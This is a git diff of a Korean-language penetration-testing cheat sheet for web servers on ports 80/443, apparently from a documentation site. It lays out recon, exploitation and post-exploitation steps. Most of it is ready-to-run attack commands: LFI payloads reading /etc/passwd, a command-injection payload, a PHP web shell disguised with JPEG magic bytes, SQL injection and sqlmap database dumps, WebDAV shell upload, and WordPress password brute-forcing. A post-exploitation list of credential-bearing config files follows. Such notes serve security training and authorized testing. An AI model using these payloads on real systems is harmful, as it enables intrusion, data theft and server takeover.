@@ -1,191 +1,151 @@
 ---
 sidebar_position: 17
+title: HTTP/HTTPS (Port 80/443)
 ---
 
-# HTTP/HTTPS - 80/443
+# HTTP/HTTPS (Port 80/443) 취약점 진단
 
-## 기본 정보
+## Overview
 
-**포트**: 80 (HTTP), 443 (HTTPS), 8080, 8443 (대체 포트)
+**HTTP/HTTPS**: 웹 서비스 통신 프로토콜. 다양한 공격 벡터가 존재하여 가장 복잡하고 중요한 진단 대상
 
-HTTP는 웹 서버와 클라이언트 간의 통신 프로토콜입니다.
+**공격 마인드셋 (Source & Sink)**:
+- **Source (입력 지점)**: GET/POST 파라미터, 쿠키, HTTP 헤더, API 바디, 파일 업로드 등 사용자 입력 가능 영역 파악
+- **Sink (사용 지점)**: DB 쿼리, 시스템 명령어, 파일 시스템, 외부 API 등 입력값 처리 지점 파악
+- **핵심 질문**: 입력값 통제 가능 여부, 필터링 유무, 페이로드 실행 가능성 분석
 
-## 웹 서버 시작
+---
 
-### Python HTTP Server
+## Assessment Checklist
 
+- [ ] **웹 서버/프레임워크 스택 식별**: 사용하는 서버(Nginx, Apache), 프레임워크(Spring, PHP), CMS(WordPress) 종류 및 구버전 여부 점검
+- [ ] **크롤링/숨김 디렉토리 스캔**: `robots.txt` 및 디렉토리 브루트포싱을 통한 관리자 페이지, 백업 파일 노출 점검
+- [ ] **주요 웹 취약점 존재 여부**: SQL 인젝션, LFI, Command Injection, 파일 업로드 취약점 등 OWASP Top 10 기반 점검
+- [ ] **WebDAV 설정 결함**: 불필요한 WebDAV 활성화 및 파일 쓰기(PUT) 허용 여부 점검
+
+---
+
+## 1. Reconnaissance
+
+### 웹 서버 및 기술 스택 확인
 ```bash
-# Python 2
-sudo python -m SimpleHTTPServer 80
+# Nmap HTTP 관련 스크립트 스캔
+nmap -p 80,443 -sV --script http-title,http-headers,http-enum <target>
 
-# Python 3
-sudo python3 -m http.server 80
+# cURL을 이용한 헤더 정보 획득
+curl -I http://<target>
 
-# 특정 디렉토리 공유
-cd /path/to/share
-python3 -m http.server 8080
+# WhatWeb을 이용한 상세 기술 스택 식별
+whatweb http://<target>
 ```
 
-### PHP Webserver
-
+### 크롤러 접근 규칙 및 숨김 경로 확인
 ```bash
-# PHP 내장 서버
-sudo php -S 127.0.0.1:80
-
-# 특정 디렉토리
-sudo php -S 0.0.0.0:80 -t /var/www/html
+# robots.txt 내용 확인 (크롤링 차단된 관리자/백업 디렉토리 탐색)
+curl http://<target>/robots.txt
 ```
 
-### Apache2
-
+### 디렉토리 브루트포싱 (Directory Enumeration)
 ```bash
-# Apache 시작
-sudo service apache2 start
-sudo systemctl start apache2
+# ffuf를 이용한 디렉토리 스캔 (추천)
+ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
 
-# 웹 루트 디렉토리
-/var/www/html/
+# 파일 확장자 지정 스캔
+ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.bak
 
-# 파일 복사
-sudo cp /path/to/file /var/www/html/
+# Gobuster를 이용한 스캔
+gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,zip,bak
 ```
 
-## Nmap
+---
 
+## 2. Exploitation
+
+### 주요 웹 취약점 테스트 (Web Vulnerabilities)
+
+**LFI (Local File Inclusion)**
 ```bash
-# HTTP 버전 확인
-sudo nmap -p80,443 -sV <RHOST>
+# 기본 LFI 테스트 (URL 인코딩 및 널 바이트 활용)
+curl "http://<target>/page.php?file=../../../../etc/passwd"
+curl "http://<target>/page.php?file=../../../../etc/passwd%00"
 
-# HTTP 메서드 확인
-sudo nmap -p80 --script http-methods <RHOST>
-
-# HTTP 제목 확인
-sudo nmap -p80 --script http-title <RHOST>
-
-# HTTP 헤더 확인
-sudo nmap -p80 --script http-headers <RHOST>
-
-# HTTP 열거
-sudo nmap -p80 --script http-enum <RHOST>
-
-# WebDAV 확인
-sudo nmap -p80 --script http-webdav-scan <RHOST>
-
-# 취약점 스캔
-sudo nmap -p80,443 --script http-vuln-* <RHOST>
+# LFImap 자동화 도구 활용
+python3 lfimap.py -U "http://<target>/page.php?file=test" -a
 ```
 
-## curl
-
+**Command Injection**
 ```bash
-# 기본 GET 요청
-curl http://<RHOST>
-
-# 헤더 포함
-curl -I http://<RHOST>
-
-# POST 요청
-curl -X POST http://<RHOST>/api -d "param=value"
-
-# JSON POST
-curl -X POST http://<RHOST>/api -H "Content-Type: application/json" -d '{"key":"value"}'
-
-# 쿠키 사용
-curl -b "session=abc123" http://<RHOST>
-
-# 쿠키 저장
-curl -c cookies.txt http://<RHOST>
-
-# User-Agent 변경
-curl -A "Mozilla/5.0" http://<RHOST>
-
-# 파일 다운로드
-curl -O http://<RHOST>/file.txt
-
-# 리다이렉트 따라가기
-curl -L http://<RHOST>
-
-# 인증
-curl -u username:password http://<RHOST>
+# OS 명령어 연산자 및 URL 인코딩 주입 테스트
+# ; ( %3B ), | ( %7C ), && ( %26%26 )
+curl "http://<target>/ping.php?ip=127.0.0.1%3B+whoami"
 ```
 
-## wget
-
+**파일 업로드 우회 (File Upload Bypass)**
 ```bash
-# 파일 다운로드
-wget http://<RHOST>/file.txt
-
-# 재귀 다운로드
-wget -r http://<RHOST>/
-
-# 배경 다운로드
-wget -b http://<RHOST>/file.txt
-
-# 계속 다운로드
-wget -c http://<RHOST>/file.txt
-
-# User-Agent 변경
-wget --user-agent="Mozilla/5.0" http://<RHOST>
+# 1. 파일 확장자 우회: shell.php.jpg, shell.php%00.jpg, shell.pHp
+# 2. Content-Type 변조 (Burp Suite 활용): image/jpeg 로 조작
+# 3. 매직 바이트(Magic Byte) 추가 결합
+echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell.php
 ```
 
-## Directory Enumeration
-
-### ffuf
-
+**SQL Injection**
 ```bash
-# 디렉토리 브루트포스
-ffuf -u http://<RHOST>/FUZZ -w /usr/share/wordlists/dirb/common.txt
+# 기본 수동 페이로드 주입
+curl "http://<target>/login.php" -d "username=admin'--&password=a"
 
-# 파일 확장자 포함
-ffuf -u http://<RHOST>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html
-
-# POST 파라미터 퍼징
-ffuf -u http://<RHOST>/login -w /path/to/wordlist.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"
+# SQLMap을 이용한 데이터베이스 자동 열거 및 덤프
+sqlmap -u "http://<target>/page.php?id=1" --dbs
+sqlmap -u "http://<target>/page.php?id=1" -D <database> -T <table> --dump
 ```
 
-### Gobuster
-
+### WebDAV 취약점 테스트
 ```bash
-# 디렉토리 스캔
-gobuster dir -u http://<RHOST>/ -w /usr/share/wordlists/dirb/common.txt
+# davtest를 이용한 WebDAV 업로드 가능 여부 자동 진단
+davtest -url http://<target>/webdav/
 
-# 파일 확장자 지정
-gobuster dir -u http://<RHOST>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
-
-# DNS 서브도메인 열거
-gobuster dns -d <DOMAIN> -w /usr/share/wordlists/subdomains.txt
-
-# Vhost 열거
-gobuster vhost -u http://<RHOST> -w /usr/share/wordlists/subdomains.txt
-```
-
-## WebDAV
-
-### davtest
-
-```bash
-# WebDAV 테스트
-davtest -url http://<RHOST>/webdav/
-```
-
-### cadaver
-
-```bash
-# WebDAV 연결
-cadaver http://<RHOST>/webdav/
-
-# 파일 업로드
+# cadaver를 이용한 수동 연결 및 파일 업로드
+cadaver http://<target>/webdav/
 dav:/webdav/> put shell.php
 ```
 
-## 참고
+### CMS 전용 취약점 진단 (WordPress)
+```bash
+# WPScan을 이용한 사용자, 테마, 플러그인 열거
+wpscan --url http://<target> --enumerate p,t,u
 
-- 디렉토리 열거 (ffuf, Gobuster, dirbuster)
-- 취약점 스캔 (Nikto, WPScan)
-- 파일 업로드 취약점
-- LFI/RFI 테스트
-- SQL Injection
-- XSS
-- SSRF
-- XXE
-- 더 자세한 웹 공격 기법은 Web Application Analysis 섹션 참고
+# 계정 브루트포스 공격
+wpscan --url http://<target> --usernames admin --passwords /usr/share/wordlists/rockyou.txt
+```
+
+---
+
+## 3. Advanced Techniques
+
+### 간이 웹 서버 구동 (Payload Delivery)
+타겟 서버로 익스플로잇 페이로드를 넘겨주기 위한 로컬 웹 서버 임시 구동
+```bash
+# Python 3 내장 HTTP 서버 오픈
+python3 -m http.server 80
+
+# PHP 내장 웹 서버 오픈
+sudo php -S 0.0.0.0:80 -t /var/www/html
+```
+
+### cURL 및 Wget 활용 팁
+```bash
+# [cURL] 쿠키 포함, POST 데이터 전송 및 리다이렉트 추적
+curl -b "session=abc123" -X POST -d "param=value" -L http://<target>
+
+# [Wget] 백그라운드 재귀 다운로드
+wget -b -r http://<target>/
+```
+
+---
+
+## 4. Post-Exploitation
+웹 서버 장악 후 시스템 내부로 권한 확장을 위한 주요 설정 파일 확인
+
+**웹 서버 설정 파일 주요 위치:**
+- Apache: `/etc/apache2/apache2.conf`, `/etc/httpd/conf/httpd.conf`
+- Nginx: `/etc/nginx/nginx.conf`
+- 웹 루트 디렉토리 내 DB 연결 정보: `wp-config.php`, `config.php`, `.env` 파일 등
